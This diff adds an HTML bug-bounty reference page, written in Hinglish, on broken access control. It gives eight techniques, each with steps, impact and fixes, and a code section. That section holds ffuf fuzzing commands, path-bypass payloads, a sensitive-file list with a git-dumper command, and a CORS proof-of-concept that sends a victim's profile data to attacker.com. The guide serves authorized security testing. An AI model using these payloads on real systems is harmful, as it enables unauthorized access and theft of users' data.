@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Broken Access Control (BAC) Advanced Arsenal — Recon Notes</title>
+<style>
+  :root{
+    --bg:#060a12; --panel:#0b1120; --panel2:#0e1830; --border:#1c2942;
+    --green:#39ff9d; --cyan:#4fd8ff; --pink:#ff5ea8; --yellow:#ffd447;
+    --red:#ff5470; --purple:#b98bff; --text:#c9d6f0; --dim:#7186ad;
+  }
+  *{box-sizing:border-box;}
+  body{ margin:0; background: radial-gradient(circle at 10% 0%, rgba(79,216,255,0.08), transparent 40%),
+      radial-gradient(circle at 90% 20%, rgba(185,139,255,0.08), transparent 40%), var(--bg);
+    color:var(--text); font-family:'Consolas','SF Mono',monospace; line-height:1.6; padding:0 0 60px 0; }
+  header{ text-align:center; padding:38px 20px 22px; border-bottom:1px solid var(--border);
+    background:linear-gradient(180deg, rgba(79,216,255,0.06), transparent); }
+  header h1{ margin:0; font-size:2rem; letter-spacing:2px; color:var(--cyan); text-shadow:0 0 18px rgba(79,216,255,0.55); }
+  header .sub{ color:var(--dim); margin-top:10px; font-size:0.95rem; }
+  header .warn{ display:inline-block; margin-top:16px; padding:8px 16px; border:1px solid var(--red);
+    color:var(--red); border-radius:6px; font-size:0.85rem; background:rgba(255,84,112,0.07); }
+  nav{ max-width:1100px; margin:26px auto; padding:0 20px; display:flex; flex-wrap:wrap; gap:8px; justify-content:center; }
+  nav a{ color:var(--green); border:1px solid var(--border); padding:6px 12px; border-radius:20px;
+    text-decoration:none; font-size:0.8rem; background:var(--panel); transition:0.2s; }
+  nav a:hover{ border-color:var(--green); box-shadow:0 0 10px rgba(57,255,157,0.35); }
+  main{ max-width:1100px; margin:0 auto; padding:0 20px; display:flex; flex-direction:column; gap:26px; }
+  .card{ background:linear-gradient(180deg, var(--panel2), var(--panel)); border:1px solid var(--border);
+    border-radius:10px; padding:24px 26px; position:relative; overflow:hidden; }
+  .card::before{ content:""; position:absolute; top:0; left:0; right:0; height:3px; background:var(--accent); }
+  .tag{ display:inline-block; font-size:0.7rem; letter-spacing:1px; padding:3px 9px; border-radius:4px;
+    color:#04121a; background:var(--accent); font-weight:bold; margin-bottom:10px; }
+  .card h2{ margin:4px 0 12px; font-size:1.35rem; color:var(--accent); }
+  .card p.desc{ color:var(--text); margin:0 0 14px; }
+  .steps{ background:rgba(0,0,0,0.28); border:1px solid var(--border); border-radius:8px; padding:14px 18px; margin:12px 0; }
+  .steps h3{ margin:0 0 8px; font-size:0.85rem; color:var(--dim); text-transform:uppercase; letter-spacing:1px; }
+  .steps ol{ margin:0; padding-left:20px; } .steps li{ margin-bottom:6px; }
+  .example{ background:#020408; border:1px solid var(--border); border-left:3px solid var(--accent);
+    border-radius:6px; padding:14px 16px; font-size:0.85rem; overflow-x:auto; margin:12px 0; color:#8fffc0; white-space:pre-wrap; }
+  .example .c1{color:var(--cyan);} .example .c2{color:var(--pink);} .example .c3{color:var(--yellow);} .example .ok{color:var(--green);}
+  .impact{ display:flex; gap:10px; align-items:center; margin-top:14px; padding:10px 14px; border-radius:6px;
+    background:rgba(255,84,112,0.08); border:1px solid rgba(255,84,112,0.35); color:var(--red); font-size:0.85rem; }
+  .fix{ margin-top:10px; padding:10px 14px; border-radius:6px; background:rgba(57,255,157,0.06);
+    border:1px solid rgba(57,255,157,0.3); color:var(--green); font-size:0.85rem; }
+  code{ color:var(--yellow); }
+  .codesection{ max-width:1100px; margin:10px auto 0; padding:0 20px; }
+  .codesection-header{ text-align:center; padding:30px 20px 10px; }
+  .codesection-header h1{ margin:0; font-size:1.8rem; color:var(--yellow); text-shadow:0 0 16px rgba(255,212,71,0.5); letter-spacing:2px; }
+  .codesection-header p{ color:var(--dim); margin-top:8px; }
+  .codeblock{ background:linear-gradient(180deg, var(--panel2), var(--panel)); border:1px solid var(--border);
+    border-radius:10px; padding:20px 24px; margin-bottom:20px; }
+  .codeblock h3{ color:var(--yellow); margin:0 0 12px; font-size:1.05rem; border-bottom:1px dashed var(--border); padding-bottom:8px;}
+  .codeblock .example{ margin:10px 0; }
+  .codeblock p.note{ color:var(--dim); font-size:0.8rem; margin:6px 0 0; }
+  footer{ text-align:center; color:var(--dim); font-size:0.8rem; margin-top:40px; padding:0 20px; }
+  footer .box{ max-width:700px; margin:0 auto; border:1px dashed var(--border); border-radius:8px; padding:16px; }
+</style>
+</head>
+<body>
+
+<header>
+  <h1>&gt; BROKEN_ACCESS_CONTROL_ADVANCED.md</h1>
+  <div class="sub">BAC (OWASP #1) — advanced techniques + poora code arsenal</div>
+  <div class="warn">⚠ Sirf authorized programs (HackerOne scope) pe hi apply karna — bina permission illegal hai</div>
+</header>
+
+<nav>
+  <a href="#t1">01 Forced Browsing</a>
+  <a href="#t2">02 HTTP Method Bypass</a>
+  <a href="#t3">03 Parameter-Based Role Bypass</a>
+  <a href="#t4">04 Path Manipulation Bypass</a>
+  <a href="#t5">05 Missing Function-Level Check</a>
+  <a href="#t6">06 Metadata/Static-File BAC</a>
+  <a href="#t7">07 Multi-Step Process Bypass</a>
+  <a href="#t8">08 CORS Misconfiguration</a>
+  <a href="#code">💾 Code Arsenal</a>
+</nav>
+
+<main>
+
+  <!-- 01 -->
+  <div class="card" id="t1" style="--accent:var(--green)">
+    <span class="tag">FOUNDATION</span>
+    <h2>01. Forced Browsing (Hidden/Unlinked Pages)</h2>
+    <p class="desc">BAC ka matlab hai — server yeh check nahi karta ki user ko is resource/action ki "permission" hai ya nahi. Sabse pehla step hai un pages/endpoints ko dhoondna jo UI mein link nahi hain lekin exist karte hain.</p>
+    <div class="steps">
+      <h3>Steps</h3>
+      <ol>
+        <li>JS files, sitemap.xml, robots.txt mein hidden paths dhoondo.</li>
+        <li>Common wordlist (admin, dashboard, export, reports, settings) se ffuf/gobuster chalao.</li>
+        <li>Har mila hua path bina login ke, aur normal-user login ke saath try karo.</li>
+        <li>Jahan bhi content mil jaaye jo milna nahi chahiye — BAC confirmed.</li>
+      </ol>
+    </div>
+    <div class="example">ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302</div>
+    <div class="impact">💥 Impact: Hidden admin/internal features expose ho jaate hain.</div>
+    <div class="fix">🛡 Fix: "Hidden" hona security nahi hai — har route pe explicit authorization check karo.</div>
+  </div>
+
+  <!-- 02 -->
+  <div class="card" id="t2" style="--accent:var(--cyan)">
+    <span class="tag">CRITICAL</span>
+    <h2>02. HTTP Method-Based Bypass</h2>
+    <p class="desc">Kai apps sirf GET pe access-control check karte hain, lekin same URL pe POST/PUT/DELETE/PATCH try karne pe check missing hota hai — ya vice-versa.</p>
+    <div class="steps">
+      <h3>Steps</h3>
+      <ol>
+        <li>Ek protected endpoint dhoondo jaha GET blocked hai (403 milta hai).</li>
+        <li>Same URL pe POST, PUT, DELETE, PATCH try karo.</li>
+        <li>HEAD method bhi try karo — kai frameworks HEAD ko GET jaisa treat nahi karte authorization mein.</li>
+        <li>Method-override headers bhi try karo (Code Arsenal mein hain).</li>
+      </ol>
+    </div>
+    <div class="example">GET /api/admin/users/5 → 403 Forbidden
+<span class="c2">DELETE</span> /api/admin/users/5 → <span class="ok">200 OK</span>   <span class="c3">// delete allowed ho gaya!</span></div>
+    <div class="impact">💥 Impact: Read-block hone ke bawajood write/delete actions perform ho jaate hain.</div>
+    <div class="fix">🛡 Fix: Authorization middleware ko har HTTP method pe uniformly apply karo.</div>
+  </div>
+
+  <!-- 03 -->
+  <div class="card" id="t3" style="--accent:var(--pink)">
+    <span class="tag">CRITICAL</span>
+    <h2>03. Parameter-Based Role/Permission Bypass</h2>
+    <p class="desc">Agar request mein role/permission field client se aati hai (jaise hidden form field, JSON body parameter) aur server usi pe bharosa karta hai — badal ke privilege escalate ho sakta hai.</p>
+    <div class="steps">
+      <h3>Steps</h3>
+      <ol>
+        <li>Request body/params mein <code>role</code>, <code>isAdmin</code>, <code>permission_level</code>, <code>account_type</code> jaisi fields dhoondo.</li>
+        <li>Value ko higher-privilege value se replace karo.</li>
+        <li>Response/behavior change hota hai kya check karo.</li>
+        <li>Hidden form fields (page source mein) bhi check karo — kabhi UI se hi role field bhej di jaati hai.</li>
+      </ol>
+    </div>
+    <div class="example">POST /api/checkout
+{"user_id":1042,"cart":[...],<span class="c2">"is_admin_override":true</span>}
+<span class="c3">// developer ne debug/testing ke liye chhod diya, production mein exploit ho gaya</span></div>
+    <div class="impact">💥 Impact: Client-controlled privilege — direct escalation.</div>
+    <div class="fix">🛡 Fix: Role/permission hamesha server-side session/DB se fetch karo, kabhi client input se mat lo.</div>
+  </div>
+
+  <!-- 04 -->
+  <div class="card" id="t4" style="--accent:var(--yellow)">
+    <span class="tag">ADVANCED</span>
+    <h2>04. Path Manipulation Bypass (Trailing Slash, Case, Encoding)</h2>
+    <p class="desc">Kai access-control rules (WAF, reverse-proxy, ya app-code) URL ka exact-match check karte hain. Thoda sa path variation dena hi rule ko match hone se rok deta hai, jabki backend route wahi resolve kar deta hai.</p>
+    <div class="steps">
+      <h3>Steps</h3>
+      <ol>
+        <li>Blocked endpoint dhoondo (403/401 milta hai).</li>
+        <li>Trailing slash add/remove karo (<code>/admin</code> vs <code>/admin/</code>).</li>
+        <li>Case change karo (<code>/Admin</code>, <code>/ADMIN</code>).</li>
+        <li>Extra characters/encoding try karo (<code>/admin/.</code>, <code>/admin%20</code>, <code>/admin..;/</code>, <code>//admin</code>).</li>
+        <li>URL-encoding try karo path segments mein (<code>%2e%2e/admin</code>).</li>
+      </ol>
+    </div>
+    <div class="example">/admin           → 403 Forbidden
+/admin/          → 403 Forbidden
+<span class="c2">/admin/.</span>        → <span class="ok">200 OK</span>
+<span class="c2">/ADMIN</span>          → <span class="ok">200 OK</span>
+<span class="c2">/admin%20</span>       → <span class="ok">200 OK</span>
+<span class="c2">/./admin</span>        → <span class="ok">200 OK</span></div>
+    <div class="impact">💥 Impact: WAF/proxy-level ka access-control app-level se mismatch hone ki wajah se bypass.</div>
+    <div class="fix">🛡 Fix: Access-control checks application-code mein hi karo (proxy/WAF pe akela depend mat karo), path normalize karke hi match karo.</div>
+  </div>
+
+  <!-- 05 -->
+  <div class="card" id="t5" style="--accent:var(--purple)">
+    <span class="tag">CRITICAL</span>
+    <h2>05. Missing Function-Level Access Control (Frontend-Only Hiding)</h2>
+    <p class="desc">Admin-only buttons/menus sirf frontend JS/CSS se hide kiye jaate hain ("agar role!=admin to button mat dikhao"), lekin backend API endpoint bina check ke sabko accept kar leta hai.</p>
+    <div class="steps">
+      <h3>Steps</h3>
+      <ol>
+        <li>Page ka JS source dekho — admin-only features ke API endpoints identify karo (chahe UI mein na dikhein).</li>
+        <li>Normal-user account se login karke wahi endpoints directly call karo.</li>
+        <li>React/Vue apps mein DevTools se hidden components/routes bhi dhoondo (component tree mein admin-routes chhupi ho sakti hain).</li>
+      </ol>
+    </div>
+    <div class="impact">💥 Impact: Admin functionality directly exploitable — UI hiding koi security nahi hai.</div>
+    <div class="fix">🛡 Fix: Har sensitive function ko backend pe explicitly authorize karo, frontend hiding ko security control mat maano.</div>
+  </div>
+
+  <!-- 06 -->
+  <div class="card" id="t6" style="--accent:var(--red)">
+    <span class="tag">MEDIUM</span>
+    <h2>06. Static File / Metadata BAC (Backup Files, .git, Config)</h2>
+    <p class="desc">Kai baar actual "access control" application logic mein sahi hoti hai, lekin webserver directly static files serve kar deta hai jo authorization se bahar hain — backup files, .git folder, config files.</p>
+    <div class="steps">
+      <h3>Steps</h3>
+      <ol>
+        <li>Common sensitive-file paths try karo: <code>/.git/config</code>, <code>/.env</code>, <code>/backup.zip</code>, <code>/config.php.bak</code>.</li>
+        <li>Agar <code>.git</code> exposed hai, poora source code download kiya ja sakta hai (Code Arsenal mein tool hai).</li>
+        <li>Admin-panel ke exported reports/CSVs bhi direct-URL se accessible hain kya check karo (bina auth).</li>
+      </ol>
+    </div>
+    <div class="example">https://target.com/.git/config
+https://target.com/.env
+https://target.com/backup.sql</div>
+    <div class="impact">💥 Impact: Source code, credentials, database dumps directly expose ho sakte hain.</div>
+    <div class="fix">🛡 Fix: Webserver config se sensitive files/directories explicitly deny karo, .git ko production se hata do.</div>
+  </div>
+
+  <!-- 07 -->
+  <div class="card" id="t7" style="--accent:var(--cyan)">
+    <span class="tag">ADVANCED</span>
+    <h2>07. Multi-Step Process Bypass (Skip Karke Direct Final Step)</h2>
+    <p class="desc">Multi-step workflows (jaise "review order → confirm → pay") mein agar har step independently authorize nahi hota, to beech ke steps skip karke seedha final/sensitive step directly call kiya ja sakta hai.</p>
+    <div class="steps">
+      <h3>Steps</h3>
+      <ol>
+        <li>Poora multi-step flow ek baar normally complete karo, Burp history mein saare requests note karo.</li>
+        <li>Fresh session/state mein sirf aakhri step ka request directly bhejo, pehle steps skip karke.</li>
+        <li>Agar accept ho jaata hai (jaise bina review ke order confirm) — step-skipping BAC confirmed.</li>
+      </ol>
+    </div>
+    <div class="impact">💥 Impact: Business-logic validations bypass, kabhi payment/approval steps tak skip ho jaate hain.</div>
+    <div class="fix">🛡 Fix: Server-side state-machine maintain karo — har step ka poora hona verify karo agle step se pehle.</div>
+  </div>
+
+  <!-- 08 -->
+  <div class="card" id="t8" style="--accent:var(--pink)">
+    <span class="tag">ADVANCED</span>
+    <h2>08. CORS Misconfiguration (Cross-Origin BAC)</h2>
+    <p class="desc">Agar API <code>Access-Control-Allow-Origin</code> ko attacker-controlled origin ke liye bhi reflect kar deta hai (aur <code>Allow-Credentials: true</code> bhi hai), to koi bhi malicious website victim ke browser se authenticated data chura sakti hai.</p>
+    <div class="steps">
+      <h3>Steps</h3>
+      <ol>
+        <li>Authenticated API request Burp mein capture karo.</li>
+        <li><code>Origin</code> header ko apne random domain se replace karo, response headers check karo.</li>
+        <li>Agar <code>Access-Control-Allow-Origin</code> tumhara diya hua origin hi reflect karta hai, aur <code>Access-Control-Allow-Credentials: true</code> bhi hai — critical misconfiguration.</li>
+        <li>PoC HTML page banao jo victim ke browser se fetch karke data steal kare (Code Arsenal mein hai).</li>
+      </ol>
+    </div>
+    <div class="example">Request:  Origin: https://evil-attacker.com
+Response: Access-Control-Allow-Origin: <span class="c2">https://evil-attacker.com</span>
+          Access-Control-Allow-Credentials: <span class="c2">true</span></div>
+    <div class="impact">💥 Impact: Cross-origin se victim ke authenticated data ka mass theft — session ke saath API access.</div>
+    <div class="fix">🛡 Fix: <code>Access-Control-Allow-Origin</code> ko strict whitelist se set karo, kabhi request ka Origin blindly reflect mat karo.</div>
+  </div>
+
+</main>
+
+<div class="codesection" id="code">
+  <div class="codesection-header">
+    <h1>💾 CODE ARSENAL — BROKEN ACCESS CONTROL</h1>
+    <p>Ready-to-use commands aur payloads</p>
+  </div>
+
+  <div class="codeblock">
+    <h3>🔍 Forced Browsing — ffuf Commands</h3>
+    <div class="example"><span class="c1"># Basic directory/file fuzzing</span>
+ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403
+
+<span class="c1"># Admin-specific wordlist</span>
+ffuf -u https://target.com/FUZZ -w admin-panels.txt -mc all -fc 404
+
+<span class="c1"># Authenticated fuzzing (cookie ke saath)</span>
+ffuf -u https://target.com/FUZZ -w wordlist.txt -H "Cookie: session=abc123" -mc 200</div>
+  </div>
+
+  <div class="codeblock">
+    <h3>🔧 Method Override Headers</h3>
+    <div class="example">X-HTTP-Method-Override: DELETE
+X-HTTP-Method: DELETE
+X-Method-Override: DELETE
+
+<span class="c1"># Curl se test karo</span>
+curl -X POST https://target.com/api/user/5 \
+  -H "X-HTTP-Method-Override: DELETE"</div>
+  </div>
+
+  <div class="codeblock">
+    <h3>🌐 Path Bypass Payload Set</h3>
+    <div class="example">/admin
+/admin/
+/admin/.
+/admin//
+/admin/..;/
+/./admin
+/ADMIN
+/Admin
+/%61dmin          <span class="c3">(URL-encoded 'a')</span>
+/admin%20
+/admin%09
+/;/admin
+//admin
+/admin?
+/admin#</div>
+  </div>
+
+  <div class="codeblock">
+    <h3>📁 Sensitive File Discovery + .git Dump Tool</h3>
+    <div class="example"><span class="c1"># Common sensitive paths</span>
+/.git/config
+/.git/HEAD
+/.env
+/.env.backup
+/config.php.bak
+/backup.zip
+/backup.sql
+/wp-config.php.bak
+/web.config
+/composer.json
+
+<span class="c1"># Agar .git expose hai, poora repo download karo</span>
+git clone https://github.com/arthaud/git-dumper.git
+python3 git-dumper.py https://target.com/.git/ ./dumped-repo</div>
+  </div>
+
+  <div class="codeblock">
+    <h3>🎭 CORS Misconfiguration — PoC HTML</h3>
+    <div class="example">&lt;html&gt;
+&lt;body&gt;
+&lt;script&gt;
+fetch("https://target.com/api/user/profile", {
+  method: "GET",
+  credentials: "include"
+})
+.then(r =&gt; r.text())
+.then(data =&gt; {
+  fetch("https://attacker.com/steal?d=" + encodeURIComponent(data));
+});
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</div>
+    <p class="note">Yeh page attacker.com pe host karo, victim ko visit karao — agar CORS misconfigured hai, victim ka data attacker ke server pe pahunch jaayega.</p>
+  </div>
+
+  <div class="codeblock">
+    <h3>🐍 Python — Automated Method-Testing Script</h3>
+    <div class="example"><span class="c1">import requests
+
+url = "https://target.com/api/admin/users/5"
+methods = ["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS"]
+headers = {"Authorization": "Bearer &lt;normal_user_token&gt;"}
+
+for m in methods:
+    r = requests.request(m, url, headers=headers)
+    print(f"{m}: {r.status_code}")</span></div>
+  </div>
+
+  <div class="codeblock">
+    <h3>🔎 Burp Autorize — Two-Session Diffing (Recap)</h3>
+    <div class="example">1. BApp Store se Autorize extension install karo
+2. Low-privilege user ka session-token configure karo
+3. High-privilege (victim/admin) session se poori app browse karo
+4. Autorize automatically low-priv token se sab requests replay karega
+5. "Bypassed" results table mein missing-authorization endpoints dikh jaayenge</div>
+  </div>
+
+</div>
+
+<footer>
+  <div class="box">
+    Ye reference sirf <strong style="color:var(--green)">authorized</strong> HackerOne / apne lab targets pe testing ke liye hai.<br>
+    Bina permission kisi bhi live system pe try karna cybercrime hai (IT Act 2000).<br><br>
+    Recon Notes ka part — roadmap: Bug Bounty → Red Team → OSCP
+  </div>
+</footer>
+
+</body>
+</html>
